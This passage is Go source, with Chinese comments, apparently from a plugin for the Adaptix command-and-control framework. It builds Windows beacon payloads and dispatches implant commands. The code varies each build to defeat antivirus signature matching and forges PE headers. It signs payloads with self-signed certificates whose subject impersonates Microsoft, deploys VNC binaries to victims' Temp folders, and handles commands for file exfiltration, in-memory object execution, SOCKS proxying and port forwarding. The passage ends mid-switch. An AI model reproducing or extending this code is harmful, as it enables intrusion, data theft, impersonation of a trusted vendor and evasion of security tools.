			//   'volatile void (*)()'）。少了这两个字，diversify.o **永远编不出来**，
			//   而失败只写一行 BUILD_LOG_INFO —— 结果就是每次生成出来的载荷 `.text` 逐字节
			//   相同（实测两次独立构建差异全在 .rsrc/证书，代码段 0 差异），per-build 多样化
			//   形同虚设，云模型一个样本就能锁死整批载荷。
			divArgs := append(strings.Fields(cFlags), "-D", "BEACON_"+strings.ToUpper(protocol), "-c", "-x", "c", divSrc, "-o", divObj)
			if err := Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, Compiler, divArgs...); err == nil {
				Files += divObj + " "
			} else {
				// 用 ERROR 而不是 INFO：这条以前是 INFO，没人看见，一挂就是几个月。
				_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_ERROR, fmt.Sprintf("diversify compile FAILED (payload will be byte-identical to previous builds): %v", err))
			}
		}
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Linking payload...")

	var buildArgs []string
	buildArgs = append(buildArgs, strings.Fields(lFlags)...)
	buildArgs = append(buildArgs, strings.Fields(Files)...)
	if postLibs != "" {
		buildArgs = append(buildArgs, strings.Fields(postLibs)...)
	}
	buildArgs = append(buildArgs, "-o", buildPath)

	err = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, Compiler, buildArgs...)
	if err != nil {
		_ = os.RemoveAll(tempDir)
		return nil, "", err
	}

	var objcopyBin string
	if strings.HasSuffix(Compiler, "g++") {
		objcopyBin = strings.TrimSuffix(Compiler, "g++") + "objcopy"
	} else if Compiler == "clang++" {
		if generateConfig.Arch == "x86" {
			objcopyBin = "i686-w64-mingw32-objcopy"
		} else {
			objcopyBin = "x86_64-w64-mingw32-objcopy"
		}
	}
	if objcopyBin != "" {
		stripCmd := fmt.Sprintf("%s -R .comment %q 2>/dev/null || true; %s -R .buildid %q 2>/dev/null || true; %s -R .gnu.build.attributes %q 2>/dev/null || true",
			objcopyBin, buildPath, objcopyBin, buildPath, objcopyBin, buildPath)
		_ = Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", stripCmd)
	}

	// L4 PE post-processing (BEACON_PE_MOD_FLAGS): inject a valid MSVC Rich header,
	// write a correct checksum, randomize timestamp.
	// 开关：控制台显式勾选/取消优先，nil 时回落到 buildenv.mk 的 BEACON_PE_HEADER_MOD。
	// 只对有 PE 头的产物生效（Shellcode / Hex C 没有头可改）。
	if generateConfig.effectivePeHeaderMod() && generateConfig.peFormat() {
		peModPath, _ := filepath.Abs(filepath.Join(ModuleDir, "pe_header_mod.py"))
		if _, err := os.Stat(peModPath); err == nil {
			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Applying PE header modifications (Rich header injection + normalization)...")
			peCmd := fmt.Sprintf("python3 %q %q %q.pe_mod %s && mv %q.pe_mod %q",
				peModPath, buildPath, buildPath, buildEnv["BEACON_PE_MOD_FLAGS"], buildPath, buildPath)
			if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", peCmd); err != nil {
				_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("PE header mod skipped: %v", err))
			}
		} else {
			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("pe_header_mod.py not found at %s, skipping PE post-processing", peModPath))
		}
	}

	finalExePath := buildPath
	// ★ 原来只判 Format、不判开关：ExePseudoSign 声明了、Generate.tsx / ax_config.axs /
	//   webdelivery 都往里填了值，却**没有任何地方读它** ⇒ 勾选框是惰性的（取消勾选也照样签名，
	//   工具缺失时照样让生成失败）。补上开关判断，与 gopher_agent/pl_main.go 同口径。
	// ★ 再补一层：开关本身得是**三态**的（省略 = 跟随 buildenv.mk），否则不带这个键的
	//   API 调用会静默拿到未签名产物 —— 见 effectiveExePseudoSign()。
	if (generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe") && generateConfig.effectiveExePseudoSign() {
		// ★ 工具缺失时降级为不签名并继续（同上方 :1254 pe_header_mod.py 缺失的处理）。
		//   伪签名是让产物"看起来有签名"的美化步骤，缺一个可选工具不该让最常见的 EXE 载荷
		//   完全生成不出来（实测：控制台点「生成并下载」直接红字
		//   `pseudo-sign requires osslsigncode in PATH`）。
		//   只对「工具缺失」降级：签名**执行失败**仍终止 —— 可能已写出半份产物。
		if miss := pseudoSignMissingTool(); miss != "" {
			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO,
				fmt.Sprintf("pseudo-sign skipped: %s not in server PATH — payload will be UNSIGNED (install it: pre_install_linux_all.sh server)", miss))
		} else {
			signedPath := tempDir + "/file_signed.exe"
			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Applying random self-signed Authenticode (openssl + osslsigncode)...")
			// 证书主体跟着身份池走：冒充微软时用微软 DN，中性身份时用虚构厂商 DN。
			// 三处同源（文件名 / 版本信息 / 签名主体）这条原则在这里同样成立。
			signSubject := microsoftSignSubject()
			if !generateConfig.effectiveDisguise() {
				signSubject = neutralSignSubject()
			}
			if err := applySelfSignedAuthenticode(buildPath, signedPath, tempDir, signSubject); err != nil {
				_ = os.RemoveAll(tempDir)
				return nil, "", err
			}
			finalExePath = signedPath
		}
	}

	buildContent, err := os.ReadFile(finalExePath)
	if err != nil {
		return nil, "", err
	}
	_ = os.RemoveAll(tempDir)

	if generateConfig.Format == "Shellcode" || generateConfig.Format == "Hex C" {
		stubContent, err := os.ReadFile(stubPath)
		if err != nil {
			return nil, "", err
		}
		Payload = append(stubContent, buildContent...)
	} else {
		Payload = buildContent
	}
	if generateConfig.Format == "Hex C" {
		Payload = []byte(formatShellcodeAsC(Payload))
	}

	// Productized Stager: host encrypted shellcode on public TS port and compile loader EXE.
	if stagerMode {
		stagerTemp, err := os.MkdirTemp("", "ax-stager-*")
		if err != nil {
			return nil, "", err
		}
		defer os.RemoveAll(stagerTemp)
		stagerBin, stagerName, err := buildWindowsStager(profile.BuilderId, currentDir, stagerTemp, Payload, listenerMap, generateConfig.Arch, generateConfig)
		if err != nil {
			return nil, "", err
		}
		Payload = stagerBin
		Filename = stagerName
	}

	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("Payload size: %d bytes", len(Payload)))

	/// END CODE HERE

	return Payload, Filename, nil
}

func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
	var agentData adaptix.AgentData

	/// START CODE HERE

	packer := CreatePacker(beat)

	if false == packer.CheckPacker([]string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array", "array"}) {
		return agentData, nil, errors.New("error agentData data")
	}

	agentData.Sleep = packer.ParseInt32()
	agentData.Jitter = packer.ParseInt32()
	agentData.KillDate = int(packer.ParseInt32())
	agentData.WorkingTime = int(packer.ParseInt32())
	agentData.ACP = int(packer.ParseInt16())
	agentData.OemCP = int(packer.ParseInt16())
	agentData.GmtOffset = int(packer.ParseInt8())
	agentData.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agentData.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIp := packer.ParseInt32()
	flag := packer.ParseInt8()

	agentData.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		agentData.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agentData.Elevated = false
	if (flag & 0b00000100) > 0 {
		agentData.Elevated = true
	}

	IsServer := false
	if (flag & 0b00001000) > 0 {
		IsServer = true
	}

	agentData.InternalIP = int32ToIPv4(internalIp)
	agentData.Os, agentData.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)

	sessionKey := packer.ParseBytes()
	transportSalt := packer.ParseBytes()
	if len(sessionKey) != 16 || len(transportSalt) != 16 {
		return agentData, nil, errors.New("invalid session key or transport salt length")
	}
	agentData.SessionKey = append(append([]byte(nil), sessionKey...), transportSalt...)
	agentData.Domain = string(packer.ParseBytes())
	agentData.Computer = string(packer.ParseBytes())
	agentData.Username = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)
	agentData.Process = Ts.TsConvertCpToUTF8(string(packer.ParseBytes()), agentData.ACP)

	/// END CODE

	return agentData, &ExtenderAgent{}, nil
}

// Extender methods

func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	sk, salt, err := SplitSessionMaterial(key)
	if err != nil {
		return nil, err
	}
	return SessionTransportCrypt(data, sk, salt, false)
	/// END CODE
}

func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
	/// START CODE
	sk, salt, err := SplitSessionMaterial(key)
	if err != nil {
		return nil, err
	}
	return SessionTransportCrypt(data, sk, salt, true)
	/// END CODE
}

func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {

	var packData []byte

	/// START CODE HERE

	var (
		array []interface{}
		err   error
	)

	for _, taskData := range tasks {
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		array = append(array, taskData.Data)
		array = append(array, int(taskId))
	}

	packData, err = PackArray(array)
	if err != nil {
		return nil, err
	}

	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
	packData = append(size, packData...)

	/// END CODE

	return packData, nil
}

func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	var (
		packData []byte
		err      error = nil
	)

	/// START CODE HERE

	id, _ := strconv.ParseInt(pivotId, 16, 64)
	array := []interface{}{COMMAND_PIVOT_EXEC, int(id), len(data), data}
	packData, _ = PackArray(array)

	/// END CODE

	taskData := adaptix.TaskData{
		TaskId: fmt.Sprintf("%08x", rand.Uint32()),
		Type:   adaptix.TASK_TYPE_PROXY_DATA,
		Data:   packData,
		Sync:   false,
	}

	return taskData, err
}

func resolveVncAgentDir() (string, error) {
	candidates := []string{
		filepath.Join(filepath.Dir(ModuleDir), "vnc", "agent"),
		filepath.Join(filepath.Dir(ModuleDir), "vnc", "dist", "agent"),
		filepath.Join(filepath.Dir(filepath.Dir(ModuleDir)), "vnc", "agent"),
		filepath.Join(filepath.Dir(filepath.Dir(ModuleDir)), "vnc", "dist", "agent"),
	}

	for _, candidate := range candidates {
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate, nil
		}
	}

	return "", fmt.Errorf("vnc agent payload directory not found")
}

func vncStreamBinaryForBeacon(agentData adaptix.AgentData) (string, string, string, error) {
	if agentData.Os != adaptix.OS_WINDOWS {
		return "", "", "", fmt.Errorf("vnc auto-start is only supported for Windows beacon agents")
	}

	vncAgentDir, err := resolveVncAgentDir()
	if err != nil {
		return "", "", "", err
	}
	remotePath := fmt.Sprintf("C:\\Windows\\Temp\\adaptix_vnc_%s_%08x.exe", agentData.Id, rand.Uint32())
	runCommand := fmt.Sprintf("\"%s\" --port", remotePath)
	return filepath.Join(vncAgentDir, "vnc_stream.exe"), remotePath, runCommand, nil
}

type nativeVncPayloadFile struct {
	LocalPath  string
	RemotePath string
}

type nativeVncPayload struct {
	Files      []nativeVncPayloadFile
	RemoteDirs []string
	RemoteDir  string
	RunCommand string
}

func windowsRemoteJoin(base string, rel string) string {
	rel = filepath.ToSlash(rel)
	rel = strings.Trim(rel, "/")
	if rel == "." || rel == "" {
		return base
	}
	return base + "\\" + strings.ReplaceAll(rel, "/", "\\")
}

func shouldDeployNativeVncFile(name string) bool {
	name = strings.ToLower(name)
	if name == "vncconfig.exe" {
		return false
	}
	switch filepath.Ext(name) {
	case ".md", ".rst", ".txt":
		return false
	default:
		return true
	}
}

func resolveNativeVncPayload(agentData adaptix.AgentData, targetPort int) (nativeVncPayload, error) {
	var payload nativeVncPayload
	if agentData.Os != adaptix.OS_WINDOWS {
		return payload, fmt.Errorf("native VNC auto-start is only supported for Windows beacon agents")
	}

	vncAgentDir, err := resolveVncAgentDir()
	if err != nil {
		return payload, err
	}

	candidates := []string{
		filepath.Join(vncAgentDir, "native", "windows"),
		filepath.Join(vncAgentDir, "winvnc"),
	}
	var payloadDir string
	for _, candidate := range candidates {
		if info, statErr := os.Stat(candidate); statErr == nil && info.IsDir() {
			payloadDir = candidate
			break
		}
	}
	if payloadDir == "" {
		return payload, fmt.Errorf("native VNC payload directory not found; place winvnc.exe and support files under %s", filepath.Join(vncAgentDir, "native", "windows"))
	}

	payload.RemoteDir = fmt.Sprintf("C:\\Windows\\Temp\\adaptix_vnc_native_%s_%08x", agentData.Id, rand.Uint32())
	remoteDirSet := map[string]struct{}{payload.RemoteDir: {}}
	var preferredExe string
	var fallbackExe string
	var startScript string

	err = filepath.WalkDir(payloadDir, func(path string, entry fs.DirEntry, walkErr error) error {
		if walkErr != nil {
			return walkErr
		}
		if path == payloadDir {
			return nil
		}

		rel, relErr := filepath.Rel(payloadDir, path)
		if relErr != nil {
			return relErr
		}
		remotePath := windowsRemoteJoin(payload.RemoteDir, rel)

		if entry.IsDir() {
			remoteDirSet[remotePath] = struct{}{}
			return nil
		}

		if !shouldDeployNativeVncFile(entry.Name()) {
			return nil
		}

		payload.Files = append(payload.Files, nativeVncPayloadFile{
			LocalPath:  path,
			RemotePath: remotePath,
		})

		name := strings.ToLower(entry.Name())
		if name == "adaptix_start.bat" || name == "adaptix_start.cmd" {
			startScript = remotePath
		}
		if strings.HasSuffix(name, ".exe") {
			if fallbackExe == "" {
				fallbackExe = remotePath
			}
			if name == "winvnc.exe" || name == "winvnc4.exe" || strings.Contains(name, "winvnc") {
				preferredExe = remotePath
			}
		}
		return nil
	})
	if err != nil {
		return payload, err
	}
	if len(payload.Files) == 0 {
		return payload, fmt.Errorf("native VNC payload directory is empty: %s", payloadDir)
	}

	for dir := range remoteDirSet {
		payload.RemoteDirs = append(payload.RemoteDirs, dir)
	}
	sort.Strings(payload.RemoteDirs)

	if startScript != "" {
		payload.RunCommand = fmt.Sprintf("cmd.exe /c \"\"%s\" %d\"", startScript, targetPort)
		return payload, nil
	}

	remoteExe := preferredExe
	if remoteExe == "" {
		remoteExe = fallbackExe
	}
	if remoteExe == "" {
		return payload, fmt.Errorf("native VNC payload must include adaptix_start.bat/cmd or a VNC server exe")
	}

	if strings.Contains(strings.ToLower(filepath.Base(remoteExe)), "winvnc") {
		payload.RunCommand = fmt.Sprintf("\"%s\" -run", remoteExe)
	} else {
		payload.RunCommand = fmt.Sprintf("\"%s\"", remoteExe)
	}
	return payload, nil
}

func queueBeaconUpload(agentData adaptix.AgentData, remotePath string, fileContent []byte) {
	memoryId := CreateTaskCommandSaveMemory(Ts, agentData.Id, fileContent)
	array := []interface{}{COMMAND_UPLOAD, memoryId, Ts.TsConvertUTF8toCp(remotePath, agentData.ACP)}

	taskData := adaptix.TaskData{
		Type:    adaptix.TASK_TYPE_TASK,
		AgentId: agentData.Id,
		Sync:    false,
		TaskId:  fmt.Sprintf("%08x", rand.Uint32()),
	}
	taskData.Data, _ = PackArray(array)
	Ts.TsTaskCreate(agentData.Id, "", "", taskData)
}

func queueBeaconMkdir(agentData adaptix.AgentData, remotePath string) {
	array := []interface{}{COMMAND_MKDIR, Ts.TsConvertUTF8toCp(remotePath, agentData.ACP)}

	taskData := adaptix.TaskData{
		Type:    adaptix.TASK_TYPE_TASK,
		AgentId: agentData.Id,
		Sync:    false,
		TaskId:  fmt.Sprintf("%08x", rand.Uint32()),
	}
	taskData.Data, _ = PackArray(array)
	Ts.TsTaskCreate(agentData.Id, "", "", taskData)
}

func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}
	subcommand, _ := args["subcommand"].(string)

	taskData = adaptix.TaskData{
		Type: adaptix.TASK_TYPE_TASK,
		Sync: true,
	}

	messageData = adaptix.ConsoleMessageData{
		Status: adaptix.MESSAGE_INFO,
		Text:   "",
	}
	messageData.Message, _ = args["message"].(string)

	/// START CODE HERE

	var array []interface{}

	switch command {

	case "cat":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_CAT, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "cd":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}

		array = []interface{}{COMMAND_CD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "cp":
		var src string
		var dst string
		src, err = getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err = getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_COPY, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}

	case "disks":
		array = []interface{}{COMMAND_DISKS}

	case "download":
		var path string
		path, err = getStringArg(args, "file")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_DOWNLOAD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "execute":
		if subcommand == "bof" {
			var bofFile string
			var bofContent []byte
			var params []byte

			taskData.Type = adaptix.TASK_TYPE_JOB

			async := getBoolArg(args, "-a")
			bofFile, err = getStringArg(args, "bof")
			if err != nil {
				goto RET
			}
			bofContent, err := resolveBofObject(bofFile)
			if err != nil {
				goto RET
			}

			paramData, ok := args["param_data"].(string)
			if ok {
				params, err = base64.StdEncoding.DecodeString(paramData)
				if err != nil {
					params = []byte(paramData)
					params = append(params, 0)
				}
			}

			array = []interface{}{COMMAND_EXEC_BOF, async, "go", len(bofContent), bofContent, len(params), params}
		} else {
			err = errors.New("subcommand must be 'bof'")
			goto RET
		}

	case "exfil":
		var fid string
		var fileId int64

		fid, err = getStringArg(args, "file_id")
		if err != nil {
			goto RET
		}
		fileId, err = strconv.ParseInt(fid, 16, 64)
		if err != nil {
			goto RET
		}

		if subcommand == "cancel" {
			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_CANCELED, int(fileId)}
		} else if subcommand == "stop" {
			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_STOPPED, int(fileId)}
		} else if subcommand == "start" {
			array = []interface{}{COMMAND_EXFIL, adaptix.DOWNLOAD_STATE_RUNNING, int(fileId)}
		} else {
			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
			goto RET
		}

	case "getuid":
		array = []interface{}{COMMAND_GETUID}

	case "jobs":
		if subcommand == "list" {
			array = []interface{}{COMMAND_JOB_LIST}

		} else if subcommand == "kill" {
			var job string
			var jobId int64

			job, err = getStringArg(args, "task_id")
			if err != nil {
				goto RET
			}
			jobId, err = strconv.ParseInt(job, 16, 64)
			if err != nil {
				goto RET
			}

			array = []interface{}{COMMAND_JOBS_KILL, int(jobId)}
		} else {
			err = errors.New("subcommand must be 'list' or 'kill'")
			goto RET
		}

	case "link":
		if subcommand == "smb" {
			var target string
			var pipename string
			target, err = getStringArg(args, "target")
			if err != nil {
				goto RET
			}
			pipename, err = getStringArg(args, "pipename")
			if err != nil {
				goto RET
			}
			pipe := fmt.Sprintf("\\\\%s\\pipe\\%s", target, pipename)

			array = []interface{}{COMMAND_LINK, 1, pipe}

		} else if subcommand == "tcp" {
			var target string
			var port float64
			target, err = getStringArg(args, "target")
			if err != nil {
				goto RET
			}
			port, err = getFloatArg(args, "port")
			if err != nil {
				goto RET
			}
			array = []interface{}{COMMAND_LINK, 2, target, int(port)}

		} else {
			err = errors.New("subcommand must be 'smb' or 'tcp'")
			goto RET
		}

	case "ls":
		var dir string
		dir, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_LS, Ts.TsConvertUTF8toCp(dir, agentData.ACP)}

	case "lportfwd":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		lportNumber, _ := getFloatArg(args, "lport")
		lport := int(lportNumber)
		if lport < 1 || lport > 65535 {
			err = errors.New("port must be from 1 to 65535")
			goto RET
		}

		if subcommand == "start" {
			var lhost string
			var fhost string
			var tunnelId string
			lhost, err = getStringArg(args, "lhost")
			if err != nil {
				goto RET
			}
			fhost, err = getStringArg(args, "fwdhost")
			if err != nil {
				goto RET
			}
			fportNumber, _ := getFloatArg(args, "fwdport")
			fport := int(fportNumber)
			if fport < 1 || fport > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			tunnelId, err = Ts.TsTunnelCreateLportfwd(agentData.Id, "", lhost, lport, fhost, fport)
			if err != nil {
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			taskData.Message = fmt.Sprintf("Started local port forwarding on %s:%d to %s:%d", lhost, lport, fhost, fport)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopLportfwd(agentData.Id, lport)

			taskData.Message = fmt.Sprintf("Local port forwarding on %d stopped", lport)
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "mv":
		var src string
		var dst string
		src, err = getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err = getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_MV, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}

	case "mkdir":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_MKDIR, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "profile":
		if subcommand == "download.chunksize" {
			var size float64
			size, err = getFloatArg(args, "size")
			if err != nil {
				goto RET
			}
			array = []interface{}{COMMAND_PROFILE, 2, int(size)}

		} else if subcommand == "killdate" {
			var dt string
			dt, err = getStringArg(args, "datetime")
			if err != nil {
				goto RET
			}

			killDate := 0
			if dt != "0" {
				var t time.Time
				t, err = time.Parse("02.01.2006 15:04:05", dt)
				if err != nil {
					err = errors.New("Invalid date format, use: 'DD.MM.YYYY hh:mm:ss'")
					goto RET
				}
				killDate = int(t.Unix())
			}
			array = []interface{}{COMMAND_PROFILE, 3, killDate}

		} else if subcommand == "workingtime" {
			var t string
			t, err = getStringArg(args, "time")
			if err != nil {
				goto RET
			}

			workingTime := 0
			if t != "0" {
				workingTime, err = parseStringToWorkingTime(t)
				if err != nil {
					goto RET
				}
			}
			array = []interface{}{COMMAND_PROFILE, 4, workingTime}

		} else {
			err = errors.New("subcommand for 'profile' not found")
			goto RET
		}

	case "ps":
		if subcommand == "list" {
			array = []interface{}{COMMAND_PS_LIST}

		} else if subcommand == "kill" {
			var pid float64
			pid, err = getFloatArg(args, "pid")
			if err != nil {
				goto RET
			}
			array = []interface{}{COMMAND_PS_KILL, int(pid)}

		} else if subcommand == "run" {
			taskData.Type = adaptix.TASK_TYPE_JOB

			output := getBoolArg(args, "-o")
			impersonation := getBoolArg(args, "-i")
			suspend := getBoolArg(args, "-s")
			programState := 0
			if suspend {
				programState = 4
			}
			programArgs, _ := args["args"].(string)
			programArgs = Ts.TsConvertUTF8toCp(programArgs, agentData.ACP)

			array = []interface{}{COMMAND_PS_RUN, output, impersonation, programState, programArgs}

		} else {
			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
			goto RET
		}

	case "pwd":
		array = []interface{}{COMMAND_PWD}

	case "rev2self":
		array = []interface{}{COMMAND_REV2SELF}

	case "rm":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_RM, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "rportfwd":
		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		lportNumber, _ := getFloatArg(args, "lport")
		lport := int(lportNumber)
		if lport < 1 || lport > 65535 {
			err = errors.New("port must be from 1 to 65535")
			goto RET
		}

		if subcommand == "start" {
			var fhost string
			fhost, err = getStringArg(args, "fwdhost")
			if err != nil {
				goto RET
			}
			fportNumber, _ := getFloatArg(args, "fwdport")
			fport := int(fportNumber)
			if fport < 1 || fport > 65535 {
				err = errors.New("port must be from 1 to 65535")
				goto RET
			}

			var tunnelId string
			tunnelId, err = Ts.TsTunnelCreateRportfwd(agentData.Id, "", lport, fhost, fport)
			if err != nil {
				goto RET
			}
			taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
			if err != nil {
				goto RET
			}

			messageData.Message = fmt.Sprintf("Starting reverse port forwarding %d to %s:%d", lport, fhost, fport)
			messageData.Status = adaptix.MESSAGE_INFO

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopRportfwd(agentData.Id, lport)

			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Reverse port forwarding has been stopped"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "sleep":
		var sleepTime int
		var sleepInt int
		sleep, err := getStringArg(args, "sleep")
		if err != nil {
			goto RET
		}
		jitter, _ := getFloatArg(args, "jitter")
		jitterTime := int(jitter)

		sleepInt, err = strconv.Atoi(sleep)
		if err == nil {
			sleepTime = sleepInt
		} else {
			var t time.Duration
			t, err = time.ParseDuration(sleep)
			if err == nil {
				sleepTime = int(t.Seconds())
			} else {
				err = errors.New("sleep must be in '%h%m%s' format or number of seconds")
				goto RET
			}
		}
		if jitterTime < 0 || jitterTime > 100 {
			err = errors.New("jitter must be from 0 to 100")
			goto RET
		}
		if jitterTime > 0 {
			messageData.Message = fmt.Sprintf("Task: sleep to %v with %v%% jitter", sleep, jitterTime)
		} else {
			messageData.Message = fmt.Sprintf("Task: sleep to %v", sleep)
		}

		array = []interface{}{COMMAND_PROFILE, 1, sleepTime, jitterTime}

	case "burst":
		if subcommand == "show" {
			array = []interface{}{COMMAND_PROFILE, 6}
			messageData.Message = "Task: show burst config"

		} else if subcommand == "set" {
			var enabled float64
			var sleepVal float64
			var jitterVal float64
			enabled, err = getFloatArg(args, "enabled")
			if err != nil {
				err = errors.New("parameter 'enabled' must be set (1=on, 0=off)")
				goto RET
			}
			burstEnabled := int(enabled)
			if burstEnabled != 0 && burstEnabled != 1 {
				err = errors.New("parameter 'enabled' must be 0 or 1")
				goto RET
			}

			burstSleep := 50
			sleepVal, err = getFloatArg(args, "sleep")
			if err == nil {
				burstSleep = int(sleepVal)
				if burstSleep < 0 || burstSleep > 10000 {
					err = errors.New("burst sleep must be from 0 to 10000 ms")
					goto RET
				}
			}

			burstJitter := 0
			jitterVal, err = getFloatArg(args, "jitter")
			if err == nil {
				burstJitter = int(jitterVal)
				if burstJitter < 0 || burstJitter > 90 {
					err = errors.New("burst jitter must be from 0 to 90%%")
					goto RET
				}
			}

			messageData.Message = fmt.Sprintf("Task: set burst config - %s", formatBurstStatus(burstEnabled, burstSleep, burstJitter))
			array = []interface{}{COMMAND_PROFILE, 5, burstEnabled, burstSleep, burstJitter}

		} else {
			err = errors.New("subcommand for 'burst' must be 'show' or 'set'")
			goto RET
		}

	case "socks":
		var portNumber float64

		taskData.Type = adaptix.TASK_TYPE_TUNNEL

		portNumber, err = getFloatArg(args, "port")
		port := int(portNumber)
		if port < 1 || port > 65535 || err != nil {
			err = errors.New("port must be from 1 to 65535")
			goto RET
		}

		if subcommand == "start" {
			var address string
			var tunnelId string
			address, err = getStringArg(args, "address")
			if err != nil {
				goto RET
			}

			version4 := getBoolArg(args, "-socks4")
			if version4 {
				tunnelId, err = Ts.TsTunnelCreateSocks4(agentData.Id, "", address, port)
				if err != nil {
					goto RET
				}
				taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
				if err != nil {
					goto RET
				}
				taskData.Message = fmt.Sprintf("Socks4 server running on port %d", port)

			} else {
				auth := getBoolArg(args, "-auth")
				if auth {
					var username string
					var password string
					username, err = getStringArg(args, "username")
					if err != nil {
						goto RET
					}
					password, err = getStringArg(args, "password")
					if err != nil {
						goto RET
					}
					tunnelId, err = Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, true, username, password)
					if err != nil {
						goto RET
					}
					taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
					if err != nil {
						goto RET
					}

					taskData.Message = fmt.Sprintf("Socks5 (with Auth) server running on port %d", port)

				} else {
					tunnelId, err = Ts.TsTunnelCreateSocks5(agentData.Id, "", address, port, false, "", "")
					if err != nil {
						goto RET
					}
					taskData.TaskId, err = Ts.TsTunnelStart(tunnelId)
					if err != nil {
						goto RET
					}

					taskData.Message = fmt.Sprintf("Socks5 server running on port %d", port)
				}
			}
			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.ClearText = "\n"

		} else if subcommand == "stop" {
			taskData.Completed = true

			Ts.TsTunnelStopSocks(agentData.Id, port)

			taskData.MessageType = adaptix.MESSAGE_SUCCESS
			taskData.Message = "Socks5 server has been stopped"
			taskData.ClearText = "\n"

		} else {
			err = errors.New("subcommand must be 'start' or 'stop'")
			goto RET
		}

	case "terminate":
		if subcommand == "thread" {
			array = []interface{}{COMMAND_TERMINATE, 1}
		} else if subcommand == "process" {
			array = []interface{}{COMMAND_TERMINATE, 2}
		} else {
			err = errors.New("subcommand must be 'thread' or 'process'")
			goto RET
		}

	case "unlink":
		var pivotName string
